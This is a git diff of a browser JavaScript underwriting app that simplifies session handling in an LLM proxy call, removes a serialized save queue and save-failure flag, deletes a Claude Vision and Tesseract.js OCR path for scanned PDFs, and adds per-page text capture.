@@ -209,11 +209,15 @@ function extractRayId(headers, bodySnippet) {
 }
 
 async function llmProxyFetch(body, extraHeaders) {
-  // Initial session check so we fail fast if the user isn't signed in at all.
-  // Per-attempt session refresh happens inside the retry loop (see F4 below).
-  {
-    const { data: { session: initialSession } } = await sb.auth.getSession();
-    if (!initialSession) throw new Error('Not signed in');
+  const { data: { session } } = await sb.auth.getSession();
+  if (!session) throw new Error('Not signed in');
+
+  const headers = {
+    'Content-Type': 'application/json',
+    'Authorization': 'Bearer ' + session.access_token
+  };
+  if (extraHeaders) {
+    for (const k in extraHeaders) headers[k] = extraHeaders[k];
   }
 
   // Pre-compute payload size for telemetry. JSON.stringify is the same call
@@ -237,26 +241,6 @@ async function llmProxyFetch(body, extraHeaders) {
     let parsed = null;
     let status = 0;
     let networkErr = null;
-
-    // Phase 10.5 F4: refresh the Supabase session on EACH attempt so the
-    // Authorization header carries a fresh access_token. Cloudflare 403 retries
-    // schedule at 5s/15s/30s plus a 2-minute per-attempt timeout — total can
-    // exceed 3 minutes worst-case. JWT expiry mid-retry would otherwise turn
-    // an otherwise-recoverable pipeline call into a hard non-retriable
-    // AUTH_ERROR. sb.auth.getSession() consults the local cached session and
-    // is cheap when the token is still valid; auto-refreshes when it isn't.
-    const { data: { session } } = await sb.auth.getSession();
-    if (!session) {
-      // Mid-flight sign-out or refresh failure — abort cleanly with a clear error.
-      throw new Error('Session expired during retry');
-    }
-    const headers = {
-      'Content-Type': 'application/json',
-      'Authorization': 'Bearer ' + session.access_token
-    };
-    if (extraHeaders) {
-      for (const k in extraHeaders) headers[k] = extraHeaders[k];
-    }
 
     // Per-attempt timeout via AbortController. Without this, a hung proxy
     // could pin a single attempt forever and we'd never get to retry.
@@ -744,20 +728,6 @@ const STATE = {
 // ============================================================================
 let SAVE_DEBOUNCE = null;
 let LAST_SAVE_TS = 0;
-// Phase 10.5 F7: separate flag so the 10s setInterval(updateSaveIndicator)
-// doesn't overwrite "Save failed" with "Saved Xs ago" — LAST_SAVE_TS used
-// to be set BEFORE the await in saveEditsNow, so on failure the indicator
-// would correctly flip to "Save failed" briefly and then get clobbered by
-// the next interval tick. Now LAST_SAVE_TS only updates on success and
-// updateSaveIndicator respects LAST_SAVE_FAILED first.
-let LAST_SAVE_FAILED = false;
-// Phase 10.5 F6 / Their #3: serialization primitive for saveEditsNow. Every
-// invocation chains behind the previous one, so a debounced save in flight
-// when the user clicks Revert / Clear / New-Submission can't land its upsert
-// AFTER our cloud-row deletes (which would resurrect just-deleted edits).
-// flushEditsNow drains the chain — used by the revert/clear/restore/
-// new-submission/rehydrate paths before they mutate cloud state.
-let SAVE_QUEUE = Promise.resolve();
 
 // Load edits scoped to the most recent pipeline run.
 //
@@ -784,36 +754,18 @@ function applyPendingEditsIfMatch(pipelineRunId) {
 }
 
 async function saveEditsNow() {
-  // Phase 10.5 F6 / Their #3: chain behind any in-flight save. Multiple rapid
-  // edits used to fire saveEditsNow concurrently — the second invocation
-  // could read a stale view of STATE.edits relative to the first's upsert.
-  // Worse: a Revert clicked while a save was in flight could complete its
-  // sbDeleteEdit before the in-flight upsert landed, resurrecting the edit.
-  // SAVE_QUEUE chains all invocations strictly in order. flushEditsNow drains
-  // it before mutating cloud state.
-  const prev = SAVE_QUEUE;
-  const promise = (async () => {
-    // Don't let an earlier failed save propagate as a rejection through the
-    // chain — we want subsequent saves to still run.
-    await prev.catch(() => {});
-    return _doSaveEditsNow();
-  })();
-  SAVE_QUEUE = promise;
-  return promise;
-}
-
-// Internal: the actual save body. Runs serialized via SAVE_QUEUE.
-async function _doSaveEditsNow() {
   // In-memory edits are persisted two ways for resilience:
   //   1) Baked into the active submission's snapshot (see archiveCurrentSubmission
   //      / rehydrateSubmission) so a reload restores cleanly.
   //   2) Per-module rows in Supabase `submission_edits` so admin views and
   //      multi-device access work.
   //
-  // Phase 10.5 F7: LAST_SAVE_TS only updates on SUCCESS. The 10s
-  // setInterval(updateSaveIndicator) reads LAST_SAVE_FAILED first now —
-  // otherwise the next tick after a failure would say "Saved Xs ago" because
-  // LAST_SAVE_TS was set at the start (pre-await) of the save attempt.
+  // Now async + awaited: the save indicator shows "Saving…" until the cloud
+  // write actually resolves, then flips to "Saved just now". Previously the
+  // indicator flipped to "Saved" optimistically before the network round-trip
+  // — misleading during testing and a real risk if the user refreshed in
+  // the gap. The visible UI now reflects actual persistence state.
+  LAST_SAVE_TS = Date.now();
   const submissionId = STATE.activeSubmissionId;
   if (!submissionId) return;   // nothing to persist yet (no archived submission)
   try {
@@ -822,8 +774,6 @@ async function _doSaveEditsNow() {
       STATE.pipelineRun || null,
       STATE.edits, STATE.customCards, STATE.hiddenCards
     );
-    LAST_SAVE_TS = Date.now();
-    LAST_SAVE_FAILED = false;
     const ind = document.getElementById('saveIndicator');
     const txt = document.getElementById('saveIndicatorText');
     if (ind && txt) {
@@ -834,38 +784,16 @@ async function _doSaveEditsNow() {
     }
   } catch (e) {
     console.warn('Edit save failed', e);
-    LAST_SAVE_FAILED = true;
     const ind = document.getElementById('saveIndicator');
     const txt = document.getElementById('saveIndicatorText');
     if (ind && txt) {
       ind.classList.remove('saving');
-      ind.classList.remove('saved');
       // Don't flip to "saved" on failure — leave the dirty signal so user
       // knows their work isn't safe.
       txt.textContent = 'Save failed';
     }
     toast('Save failed · ' + (e.message || 'network'), 'error');
   }
-}
-
-// Phase 10.5 F6 / Their #3: drain the save queue. Called by revert / clear /
-// restore / new-submission / rehydrate paths BEFORE they mutate cloud state.
-// Pattern:
-//   1) clearTimeout the debounce so a pending save doesn't fire after we drain
-//   2) if there were pending edits, fire saveEditsNow (which queues onto SAVE_QUEUE)
-//   3) await SAVE_QUEUE so any in-flight save (including the one we just queued)
-//      settles before the caller proceeds to delete cloud rows
-async function flushEditsNow() {
-  if (SAVE_DEBOUNCE) {
-    clearTimeout(SAVE_DEBOUNCE);
-    SAVE_DEBOUNCE = null;
-    // Force a save now since the debounce timer was about to. saveEditsNow
-    // adds itself to SAVE_QUEUE, which we await below.
-    saveEditsNow();
-  }
-  // Wait for whatever's in flight (including a save we may have just queued).
-  // .catch swallows so a previously-failed save doesn't reject our await.
-  await SAVE_QUEUE.catch(() => {});
 }
 
 // Debounced save — called on every edit
@@ -878,10 +806,7 @@ function markDirty() {
     txt.textContent = 'Saving…';
   }
   clearTimeout(SAVE_DEBOUNCE);
-  SAVE_DEBOUNCE = setTimeout(() => {
-    SAVE_DEBOUNCE = null;
-    saveEditsNow();
-  }, 450);
+  SAVE_DEBOUNCE = setTimeout(saveEditsNow, 450);
 }
 
 // Phase 8.5 Round 4 fix #2: resync the active submission's snapshot to current
@@ -936,18 +861,6 @@ function updateSaveIndicator() {
   const ind = document.getElementById('saveIndicator');
   const txt = document.getElementById('saveIndicatorText');
   if (!ind || !txt) return;
-  // Phase 10.5 F7: failure state wins over the timestamp-derived "Saved Xs ago"
-  // text. The 10s interval tick was overwriting "Save failed" because
-  // LAST_SAVE_TS used to be set at save START not save SUCCESS — even after a
-  // failure, the next tick would compute a recent timestamp and say "Saved
-  // just now." Now LAST_SAVE_TS only updates on success and we check the
-  // explicit failure flag here.
-  if (LAST_SAVE_FAILED) {
-    ind.classList.remove('saving');
-    ind.classList.remove('saved');
-    txt.textContent = 'Save failed';
-    return;
-  }
   if (LAST_SAVE_TS === 0) {
     txt.textContent = 'Ready';
     return;
@@ -984,15 +897,9 @@ async function clearAllEdits() {
   // If any of the three fails, the user sees an error toast instead of the
   // misleading success toast that fired pre-fix.
   let cloudOk = true;
-  // Phase 10.5 F6: drain any in-flight save AND clear any pending debounce
-  // timer BEFORE issuing sbDeleteAllEditsForSubmission. Same race shape as
-  // revertCard — without flushEditsNow, an upsert from an earlier markDirty
-  // could land AFTER our delete-all and resurrect rows. flushEditsNow also
-  // queues a final saveEditsNow against the post-clear empty state, which is
-  // a no-op upsert (no rows) but ensures the SAVE_QUEUE chain is settled.
   try {
-    await flushEditsNow();
-  } catch (e) { cloudOk = false; console.warn('clearAllEdits: flushEditsNow failed', e); }
+    await saveEditsNow();
+  } catch (e) { cloudOk = false; console.warn('clearAllEdits: saveEditsNow failed', e); }
   // Also delete remote submission_edits rows for this submission. saveEditsNow's
   // upsert path has nothing to write when local state is empty, so without
   // this delete the orphan rows would resurrect on next rehydrate.
@@ -1277,459 +1184,9 @@ loadGuidelineFromStorage();
 loadEdits();
 
 // ============================================================================
-// CLAUDE VISION — primary OCR path for scanned PDFs and images
-// ============================================================================
-// State-of-the-art document understanding. Anthropic's PDF/image input lets
-// Claude read pages natively as images — handles handwriting, table structure,
-// multi-column layouts, ACORD forms, signatures, and stamps with quality far
-// beyond Tesseract.js. Critical for production underwriting where misread
-// limits / dates / dollar amounts produce plausible-but-wrong outputs that
-// don't fail conspicuously.
-//
-// Architecture:
-//   1) PDF text-layer extraction first (fast, free — most non-scanned PDFs
-//      take this path).
-//   2) If text-layer is empty/tiny → try Claude Vision via existing llm-proxy.
-//      Reuses the entire retry/backoff/audit infrastructure built in Phase 10.
-//   3) On any vision failure → fall back to Tesseract.js (still loaded
-//      lazily, retained for offline / proxy-down scenarios).
-//   4) On total failure → manual paste modal (last resort).
-//
-// API constraints (Anthropic, as of April 2026):
-//   - Max 100 pages per PDF document block. We chunk PDFs >100 pages by
-//     splitting via pdf.js into <=100-page sub-documents, OCR each, concat.
-//   - Max 32MB per PDF (post-base64 inflation: source must be ~24MB).
-//     For oversized PDFs we render each page to JPEG via canvas and send
-//     as image content blocks instead — works for 200-page scans that
-//     would otherwise blow the size cap.
-//
-// Cost reality check: A typical scanned binder page runs ~1,500-2,500 input
-// tokens through Claude Opus 4.7. A 99-page binder costs roughly $1.50-3.00
-// per pass. Negligible against the underwriting decision being supported.
-//
-// Quality vs Tesseract: Vision ~95%+ accuracy on field-level data including
-// tables and form pairings, vs Tesseract's 60-80% on the same material with
-// table structure destroyed.
-
-const CLAUDE_VISION_CONFIG = {
-  // Use Sonnet for OCR — high quality at materially lower cost than Opus and
-  // OCR is largely a perception task, not a reasoning task. forced=true on the
-  // settings page can still route through Opus if STATE.api.forceGlobal is set.
-  model: 'claude-sonnet-4-6',
-  // Max output tokens for an OCR call. A single 100-page chunk yields ~30k-60k
-  // tokens of extracted text on average; 16384 covers most cases. If we hit the
-  // ceiling on a chunk we'll see truncation in audit and can re-chunk smaller.
-  maxOutputTokens: 16384,
-  // Chunk size for >100-page PDFs. Stays under Anthropic's 100-page hard cap
-  // with margin for cover pages / blank pages that the API still counts.
-  pagesPerChunk: 80,
-  // Per-chunk timeout in ms. Vision calls can be slow on 80-page chunks; the
-  // proxy's per-attempt timeout (LLM_PROXY_RETRY_CONFIG.perAttemptTimeout)
-  // is the actual limit but we surface a friendlier message at this threshold.
-  perChunkTimeoutMs: 240000,  // 4 minutes
-};
-
-// Extract text from a PDF via Claude Vision through the existing llm-proxy.
-// Returns { text, confidence } where confidence is the model's self-reported
-// estimate of OCR fidelity. Throws on hard failure (proxy unreachable,
-// authentication, malformed response) — the caller should fall back to
-// Tesseract on throw.
-async function extractTextViaClaudeVision(file, fileEntry) {
-  if (typeof pdfjsLib === 'undefined') throw new Error('pdf.js not loaded');
-  if (!window.currentUser) throw new Error('not signed in');
-
-  const arrayBuf = await file.arrayBuffer();
-  const pdf = await pdfjsLib.getDocument({ data: arrayBuf }).promise;
-  const totalPages = pdf.numPages;
-  // Anthropic accepts PDF source ≤32MB after base64 encoding (~24MB raw). Below
-  // that AND ≤80 pages, we can send the PDF directly as a document block — the
-  // simpler/cheaper path and Anthropic renders server-side at higher quality
-  // than our 2.0x JPEG. Above either threshold we render-to-JPEG-and-chunk.
-  const fileSizeMb = arrayBuf.byteLength / (1024 * 1024);
-  const canUseNativePdf = (totalPages <= CLAUDE_VISION_CONFIG.pagesPerChunk && fileSizeMb < 22);
-
-  if (fileEntry) {
-    fileEntry.visionInProgress = true;
-    fileEntry.visionProgress = 0;
-    fileEntry.visionTotalPages = totalPages;
-    if (typeof renderFileList === 'function') renderFileList();
-  }
-
-  try {
-    // === Path A: native PDF document block (fast, simple, best quality) ===
-    if (canUseNativePdf) {
-      try { await pdf.cleanup(); } catch (e) {}
-      try { await pdf.destroy(); } catch (e) {}
-      // Convert the original PDF arrayBuffer to base64. btoa requires a
-      // string of binary chars; chunk to avoid call-stack overflow on
-      // large files (apply on each ~8KB slice).
-      const bytes = new Uint8Array(arrayBuf);
-      let binary = '';
-      const CHUNK = 8192;
-      for (let i = 0; i < bytes.length; i += CHUNK) {
-        binary += String.fromCharCode.apply(null, bytes.subarray(i, i + CHUNK));
-      }
-      const base64Pdf = btoa(binary);
-      if (fileEntry) {
-        fileEntry.visionProgress = 0.3;  // base64 done; awaiting model response
-        if (typeof renderFileList === 'function') renderFileList();
-      }
-      const result = await callClaudeForPdfDocument(base64Pdf, file.name, totalPages);
-      if (fileEntry) fileEntry.visionProgress = 1;
-      return result;
-    }
-
-    // === Path B: render-to-JPEG chunking (for PDFs >80 pages or >22MB) ===
-    const allPages = [];
-    for (let i = 1; i <= totalPages; i++) {
-      const page = await pdf.getPage(i);
-      const viewport = page.getViewport({ scale: 2.0 });
-      const canvas = document.createElement('canvas');
-      canvas.width = viewport.width;
-      canvas.height = viewport.height;
-      const ctx = canvas.getContext('2d');
-      await page.render({ canvasContext: ctx, viewport }).promise;
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
-      const base64 = dataUrl.split(',')[1];
-      allPages.push(base64);
-      try { page.cleanup(); } catch (e) {}
-      if (fileEntry) {
-        fileEntry.visionProgress = (i / totalPages) * 0.4;
-        if (typeof renderFileList === 'function') renderFileList();
-      }
-    }
-    try { await pdf.cleanup(); } catch (e) {}
-    try { await pdf.destroy(); } catch (e) {}
-
-    const chunks = [];
-    for (let i = 0; i < allPages.length; i += CLAUDE_VISION_CONFIG.pagesPerChunk) {
-      chunks.push(allPages.slice(i, i + CLAUDE_VISION_CONFIG.pagesPerChunk));
-    }
-
-    let combinedText = '';
-    let totalConfidence = 0;
-    let totalWeight = 0;
-    for (let ci = 0; ci < chunks.length; ci++) {
-      if (fileEntry) {
-        fileEntry.visionProgress = 0.4 + (ci / chunks.length) * 0.6;
-        if (typeof renderFileList === 'function') renderFileList();
-      }
-      const chunkResult = await callClaudeForPdfImages(chunks[ci], file.name, ci, chunks.length);
-      combinedText += chunkResult.text + '\n\n';
-      const weight = Math.max(1, chunkResult.text.length);
-      totalConfidence += chunkResult.confidence * weight;
-      totalWeight += weight;
-    }
-    if (fileEntry) fileEntry.visionProgress = 1;
-    const avgConfidence = totalWeight > 0 ? Math.round(totalConfidence / totalWeight) : 0;
-    return { text: combinedText, confidence: avgConfidence };
-  } finally {
-    if (fileEntry) {
-      fileEntry.visionInProgress = false;
-      delete fileEntry.visionProgress;
-      delete fileEntry.visionTotalPages;
-      if (typeof renderFileList === 'function') renderFileList();
-    }
-  }
-}
-
-// Send a PDF directly as a document content block (preferred for small PDFs).
-// Returns { text, confidence }.
-async function callClaudeForPdfDocument(base64Pdf, fileName, totalPages) {
-  const systemPrompt =
-    'You are a document text extraction engine. Your single task is to read every page of the provided document and output the text content with maximum fidelity. ' +
-    'Preserve the visual structure: tables remain as aligned columns, form fields stay paired with their labels (e.g. "Named Insured: Acme Corp"), bullet lists stay listed, headers stay marked. ' +
-    'Read all visible text including stamps, handwritten notes (transcribe as best you can), signatures (note as [SIGNATURE]), checkbox states ([X] or [ ]), and form-field values. ' +
-    'Do not summarize. Do not interpret. Do not skip pages. Extract verbatim. ' +
-    'At the very start of your response, output a single line in this exact format: ' +
-    '__OCR_CONFIDENCE__:NN where NN is your estimated confidence percentage (0-100) in the accuracy of your extraction. ' +
-    'After that confidence line, output the extracted text with page boundaries marked as "--- PAGE N ---" between pages.';
-  const documentBlock = {
-    type: 'document',
-    source: { type: 'base64', media_type: 'application/pdf', data: base64Pdf }
-  };
-  const userTextBlock = {
-    type: 'text',
-    text: 'Document: ' + fileName + ' (' + totalPages + ' pages). Extract all text in order, page by page.'
-  };
-  const body = {
-    model: STATE.api && STATE.api.forceGlobal ? STATE.api.model : CLAUDE_VISION_CONFIG.model,
-    max_tokens: CLAUDE_VISION_CONFIG.maxOutputTokens,
-    system: systemPrompt,
-    messages: [{ role: 'user', content: [documentBlock, userTextBlock] }]
-  };
-  const data = await llmProxyFetch(body);
-  const rawText = (data && data.content && data.content[0] && data.content[0].text) || '';
-  // v8.4 fix #6 (GPT audit) — truncation detection. Anthropic returns
-  // stop_reason: 'max_tokens' when output hits maxOutputTokens. Long scans
-  // with dense text can blow past 16,384 tokens for an 80-page chunk
-  // (~30k-60k tokens of OCR output). Surface this in the audit so the UW
-  // knows the OCR is incomplete and can re-upload as smaller chunks.
-  // We don't auto-retry here — re-chunking from this layer is invasive;
-  // a clear warning lets Justin decide whether to re-upload manually.
-  const truncated = data && data.stop_reason === 'max_tokens';
-  if (truncated && typeof logAudit === 'function') {
-    logAudit('Vision', '⚠ TRUNCATED · ' + fileName + ' · OCR output hit max_tokens (' + CLAUDE_VISION_CONFIG.maxOutputTokens + '). Re-upload as smaller PDFs (under ~50 pages each) for complete extraction.', 'warn');
-  }
-  let confidence = 80;
-  let text = rawText;
-  const confMatch = rawText.match(/^\s*__OCR_CONFIDENCE__:(\d{1,3})\s*\n/);
-  if (confMatch) {
-    confidence = Math.max(0, Math.min(100, parseInt(confMatch[1], 10)));
-    text = rawText.slice(confMatch[0].length);
-  }
-  if (typeof logAudit === 'function') {
-    logAudit('Vision', 'Vision extraction · ' + fileName + ' · ' + totalPages + ' pages (native PDF block) · ' + Math.round(text.length / 1024 * 10) / 10 + 'K chars · confidence ' + confidence + '%' + (truncated ? ' · TRUNCATED' : ''), truncated ? 'warn' : 'ok');
-  }
-  return { text, confidence, truncated };
-}
-
-// Send a chunk of page images (base64 JPEGs) to Claude with an extraction prompt.
-// Returns { text, confidence }. Confidence is parsed from a structured marker
-// the prompt asks the model to emit at the start of its response.
-async function callClaudeForPdfImages(base64Pages, fileName, chunkIndex, totalChunks) {
-  const chunkLabel = totalChunks > 1
-    ? ' (chunk ' + (chunkIndex + 1) + ' of ' + totalChunks + ')'
-    : '';
-  // The prompt shape mirrors the existing classifier/extractor patterns: clear
-  // delimiters around the task, structured output marker for confidence parsing,
-  // strict instructions to preserve structure.
-  const systemPrompt =
-    'You are a document text extraction engine. Your single task is to read every page of the provided document and output the text content with maximum fidelity. ' +
-    'Preserve the visual structure: tables remain as aligned columns, form fields stay paired with their labels (e.g. "Named Insured: Acme Corp"), bullet lists stay listed, headers stay marked. ' +
-    'Read all visible text including stamps, handwritten notes (transcribe as best you can), signatures (note as [SIGNATURE]), checkbox states ([X] or [ ]), and form-field values. ' +
-    'Do not summarize. Do not interpret. Do not skip pages. Extract verbatim. ' +
-    'At the very start of your response, output a single line in this exact format: ' +
-    '__OCR_CONFIDENCE__:NN where NN is your estimated confidence percentage (0-100) in the accuracy of your extraction. ' +
-    'After that confidence line, output the extracted text with page boundaries marked as "--- PAGE N ---" between pages.';
-  const userTextBlock = {
-    type: 'text',
-    text: 'Document: ' + fileName + chunkLabel + '. Extract all text from the ' + base64Pages.length + ' attached page image' + (base64Pages.length === 1 ? '' : 's') + ' in order.'
-  };
-  const imageBlocks = base64Pages.map(b64 => ({
-    type: 'image',
-    source: { type: 'base64', media_type: 'image/jpeg', data: b64 }
-  }));
-  const body = {
-    model: STATE.api && STATE.api.forceGlobal ? STATE.api.model : CLAUDE_VISION_CONFIG.model,
-    max_tokens: CLAUDE_VISION_CONFIG.maxOutputTokens,
-    system: systemPrompt,
-    // Multi-block content array: images first, then the text instruction. This
-    // ordering matters — putting images before text gives the model the context
-    // it needs to follow the instruction correctly.
-    messages: [{ role: 'user', content: [...imageBlocks, userTextBlock] }]
-  };
-
-  // Reuses llmProxyFetch which has retry/backoff/Ray-ID logging baked in from
-  // Phase 10. No separate retry layer needed here.
-  const data = await llmProxyFetch(body);
-  const rawText = (data && data.content && data.content[0] && data.content[0].text) || '';
-  // v8.4 fix #6 (GPT audit) — truncation detection. See PDF-block call for rationale.
-  const truncated = data && data.stop_reason === 'max_tokens';
-  if (truncated && typeof logAudit === 'function') {
-    logAudit('Vision', '⚠ TRUNCATED · ' + fileName + chunkLabel + ' · OCR output hit max_tokens (' + CLAUDE_VISION_CONFIG.maxOutputTokens + '). Chunk too dense — re-upload as smaller PDFs.', 'warn');
-  }
-
-  // Parse the confidence marker. Default to 80 if the model didn't emit one
-  // (defensive — production prompts should always emit it but we don't trust).
-  let confidence = 80;
-  let text = rawText;
-  const confMatch = rawText.match(/^\s*__OCR_CONFIDENCE__:(\d{1,3})\s*\n/);
-  if (confMatch) {
-    confidence = Math.max(0, Math.min(100, parseInt(confMatch[1], 10)));
-    text = rawText.slice(confMatch[0].length);
-  }
-
-  // Audit the per-chunk call so cost/quality is visible in the admin pane.
-  if (typeof logAudit === 'function') {
-    logAudit('Vision', 'Vision extraction · ' + fileName + chunkLabel + ' · ' + base64Pages.length + ' pages · ' + Math.round(text.length / 1024 * 10) / 10 + 'K chars · confidence ' + confidence + '%' + (truncated ? ' · TRUNCATED' : ''), truncated ? 'warn' : 'ok');
-  }
-
-  return { text, confidence, truncated };
-}
-
-// Image-file variant: a single image block with the same extraction prompt.
-async function extractTextViaClaudeVisionFromImage(file, fileEntry) {
-  if (!window.currentUser) throw new Error('not signed in');
-  if (fileEntry) {
-    fileEntry.visionInProgress = true;
-    fileEntry.visionProgress = 0;
-    if (typeof renderFileList === 'function') renderFileList();
-  }
-  try {
-    const dataUrl = await new Promise((resolve, reject) => {
-      const reader = new FileReader();
-      reader.onload = () => resolve(reader.result);
-      reader.onerror = () => reject(new Error('Failed to read image'));
-      reader.readAsDataURL(file);
-    });
-    const mediaType = (dataUrl.match(/^data:([^;]+);/) || [])[1] || 'image/jpeg';
-    // Anthropic supports image/jpeg, image/png, image/gif, image/webp. Other
-    // formats (HEIC, BMP, TIFF) get re-encoded to JPEG via canvas.
-    const supportedTypes = new Set(['image/jpeg', 'image/png', 'image/gif', 'image/webp']);
-    let finalDataUrl = dataUrl;
-    let finalMediaType = mediaType;
-    if (!supportedTypes.has(mediaType)) {
-      const img = await new Promise((resolve, reject) => {
-        const i = new Image();
-        i.onload = () => resolve(i);
-        i.onerror = () => reject(new Error('Failed to decode image'));
-        i.src = dataUrl;
-      });
-      const canvas = document.createElement('canvas');
-      canvas.width = img.naturalWidth || img.width;
-      canvas.height = img.naturalHeight || img.height;
-      canvas.getContext('2d').drawImage(img, 0, 0);
-      finalDataUrl = canvas.toDataURL('image/jpeg', 0.92);
-      finalMediaType = 'image/jpeg';
-    }
-    const base64 = finalDataUrl.split(',')[1];
-    if (fileEntry) {
-      fileEntry.visionProgress = 0.5;
-      if (typeof renderFileList === 'function') renderFileList();
-    }
-    const result = await callClaudeForPdfImages([base64], file.name, 0, 1);
-    if (fileEntry) fileEntry.visionProgress = 1;
-    return result;
-  } finally {
-    if (fileEntry) {
-      fileEntry.visionInProgress = false;
-      delete fileEntry.visionProgress;
-      if (typeof renderFileList === 'function') renderFileList();
-    }
-  }
-}
-
-// ============================================================================
-// OCR — Tesseract.js fallback (offline / proxy-down scenarios)
-// ============================================================================
-// Retained as the second-tier fallback when Claude Vision fails (proxy
-// unreachable, authentication issues, oversized files, model errors).
-// Quality is materially lower than Vision on real-world broker scans, but
-// it works without network and produces SOMETHING usable on most documents.
-let __TESSERACT_LOADED = false;
-let __TESSERACT_LOADING = null;
-async function ensureTesseract() {
-  // Documents View may have already loaded Tesseract via its own loader. If so,
-  // the global is already there and we skip the script-tag injection.
-  if (typeof Tesseract !== 'undefined') { __TESSERACT_LOADED = true; return; }
-  if (__TESSERACT_LOADING) return __TESSERACT_LOADING;
-  __TESSERACT_LOADING = new Promise((resolve, reject) => {
-    const s = document.createElement('script');
-    s.src = 'https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js';
-    s.onload = () => { __TESSERACT_LOADED = true; resolve(); };
-    s.onerror = () => reject(new Error('Failed to load OCR engine'));
-    document.head.appendChild(s);
-  });
-  return __TESSERACT_LOADING;
-}
-
-// Render a pdf.js page into a canvas at high DPI suitable for OCR. The 3.5x
-// scale is what Documents View uses for its OCR rendering — anything lower
-// loses fidelity on small fonts.
-async function pdfPageToCanvas(page, scale) {
-  const viewport = page.getViewport({ scale: scale || 3.5 });
-  const canvas = document.createElement('canvas');
-  canvas.width = viewport.width;
-  canvas.height = viewport.height;
-  const ctx = canvas.getContext('2d');
-  await page.render({ canvasContext: ctx, viewport }).promise;
-  return canvas;
-}
-
-// Grayscale + contrast stretch + 2x upscale for low-DPI scans. Same pre-processing
-// the Documents View uses; Tesseract accuracy improves materially with this step.
-function preprocessCanvasForOCR(srcCanvas) {
-  const up = (srcCanvas.width < 1000 || srcCanvas.height < 1000) ? 2 : 1;
-  const dst = document.createElement('canvas');
-  dst.width = srcCanvas.width * up;
-  dst.height = srcCanvas.height * up;
-  const ctx = dst.getContext('2d');
-  ctx.imageSmoothingEnabled = true;
-  ctx.imageSmoothingQuality = 'high';
-  ctx.drawImage(srcCanvas, 0, 0, dst.width, dst.height);
-  const imgData = ctx.getImageData(0, 0, dst.width, dst.height);
-  const d = imgData.data;
-  let sum = 0, count = 0;
-  for (let i = 0; i < d.length; i += 4) {
-    const g = Math.round(0.299 * d[i] + 0.587 * d[i + 1] + 0.114 * d[i + 2]);
-    d[i] = d[i + 1] = d[i + 2] = g;
-    sum += g; count++;
-  }
-  const mean = sum / count;
-  for (let i = 0; i < d.length; i += 4) {
-    let v = d[i];
-    v = ((v - mean) * 1.5) + mean;          // 1.5x contrast around the mean
-    v = Math.max(0, Math.min(255, Math.round(v)));
-    d[i] = d[i + 1] = d[i + 2] = v;
-  }
-  ctx.putImageData(imgData, 0, 0);
-  return dst;
-}
-
-// OCR a single image source (canvas, dataURL, or HTMLImageElement). Returns
-// { text, confidence }. The progressCb fires repeatedly with 0..1 during
-// recognition — used by renderFileList to show a live "OCR 47%" badge.
-async function ocrImage(src, progressCb) {
-  const result = await Tesseract.recognize(src, 'eng', {
-    logger: (info) => {
-      if (info.status === 'recognizing text' && typeof progressCb === 'function') {
-        progressCb(info.progress || 0);
-      }
-    },
-  });
-  return {
-    text: (result.data && result.data.text) || '',
-    confidence: Math.round((result.data && result.data.confidence) || 0)
-  };
-}
-
-// OCR every page of a pdf.js document and concatenate. Page-level confidences
-// are averaged (weighted by page text length so a low-confidence blank cover
-// page doesn't drag the whole doc's score down). The fileEntry is mutated
-// with ocrProgress so the file list can show progress while OCR runs — the
-// caller is expected to call renderFileList before/after each page.
-async function ocrPdfDocument(pdf, fileEntry) {
-  let combinedText = '';
-  let totalConfidenceWeighted = 0;
-  let totalWeight = 0;
-  for (let i = 1; i <= pdf.numPages; i++) {
-    const pageProgress = (subProg) => {
-      if (fileEntry) {
-        // Map sub-progress within page to overall progress across pages.
-        fileEntry.ocrProgress = ((i - 1) + subProg) / pdf.numPages;
-        if (typeof renderFileList === 'function') renderFileList();
-      }
-    };
-    pageProgress(0);
-    const page = await pdf.getPage(i);
-    const rawCanvas = await pdfPageToCanvas(page, 3.5);
-    const procCanvas = preprocessCanvasForOCR(rawCanvas);
-    let pageResult;
-    try {
-      pageResult = await ocrImage(procCanvas, pageProgress);
-    } catch (err) {
-      // OCR failure on a single page shouldn't kill the whole doc — log and
-      // keep going. A missing page contributes empty text and zero weight.
-      console.warn('OCR failed on page ' + i + ' of ' + (fileEntry && fileEntry.name), err);
-      pageResult = { text: '', confidence: 0 };
-    }
-    combinedText += pageResult.text + '\n\n';
-    const weight = Math.max(1, pageResult.text.length);
-    totalConfidenceWeighted += pageResult.confidence * weight;
-    totalWeight += weight;
-    // Free pdf.js per-page caches as we go (these PDFs may be 99-page binders).
-    try { page.cleanup(); } catch (e) {}
-  }
-  if (fileEntry) fileEntry.ocrProgress = 1;
-  const avgConfidence = totalWeight > 0 ? Math.round(totalConfidenceWeighted / totalWeight) : 0;
-  return { text: combinedText, confidence: avgConfidence };
-}
-
-// ============================================================================
 // FILE PARSING — handle every document format
 // ============================================================================
-async function extractText(file, metadata, fileEntry) {
+async function extractText(file, metadata) {
   const name = file.name.toLowerCase();
   // metadata is an optional out-param object — callers can pass {} to receive
   // extraction stats (pageCount for PDFs, sheetCount for XLSX, etc.) that feed
@@ -1742,96 +1199,27 @@ async function extractText(file, metadata, fileEntry) {
     const pdf = await pdfjsLib.getDocument({ data: buf }).promise;
     let text = '';
     let totalItems = 0;
+    // v8.5 Rule 9: also build pageTexts[] indexed 0-based, so the
+    // pipeline can slice text per-section for combined PDFs.
+    const pageTexts = [];
     for (let i = 1; i <= pdf.numPages; i++) {
       const page = await pdf.getPage(i);
       const content = await page.getTextContent();
       totalItems += content.items.length;
-      text += content.items.map(it => it.str).join(' ') + '\n\n';
+      const pageText = content.items.map(it => it.str).join(' ');
+      pageTexts.push(pageText);
+      text += pageText + '\n\n';
     }
     meta.kind = 'pdf';
     meta.pageCount = pdf.numPages;
+    meta.pageTexts = pageTexts;
     // Scanned-PDF detection: empty or tiny text layer relative to page count.
-    // A real 5-page text PDF will have thousands of chars; a scanned image PDF
-    // has 0-50 chars of metadata.
+    // A real 5-page text PDF will have thousands of chars; a scanned image PDF has 0-50 chars of metadata.
     const cleanedLength = text.replace(/\s+/g, '').length;
     const avgCharsPerPage = cleanedLength / pdf.numPages;
     if (cleanedLength < 100 || avgCharsPerPage < 50) {
-      // Scanned PDF — text layer is empty or near-empty. Try the extraction
-      // chain in quality order:
-      //   1) Claude Vision (state-of-the-art accuracy on scanned underwriting
-      //      docs — handles tables, forms, handwriting, stamps natively).
-      //   2) Tesseract.js (offline-capable fallback for proxy-down scenarios;
